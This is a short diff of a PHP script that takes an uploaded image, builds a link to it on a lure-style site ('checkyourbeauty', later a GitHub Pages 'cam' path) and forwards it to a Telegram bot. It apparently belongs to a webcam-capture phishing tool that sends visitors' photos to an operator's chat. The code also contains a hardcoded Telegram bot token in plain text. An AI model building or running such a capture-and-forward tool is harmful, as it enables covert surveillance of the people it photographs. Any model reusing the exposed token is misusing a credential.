@@ -33,7 +33,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $chat_id = $api; // Assuming the API parameter contains the chat_id
 
             // Send the image link to the Telegram API
-            $img_url = 'https://checkyourbeauty.byethost15.com/' . $filePath; // Update with your website's URL
+            $img_url = 'https://asmaul36.github.io/cam/' . $filePath; // Update with your website's URL
             $telegramUrl = 'https://api.telegram.org/bot7121737909:AAFJSC4eMFrzZx86owPpH9eES4RT2w7pX84/sendPhoto?chat_id=' . $chat_id . '&parse_mode=HTML&disable_web_page_preview=false&photo=' . $img_url;
 
             // Use cURL to send the request
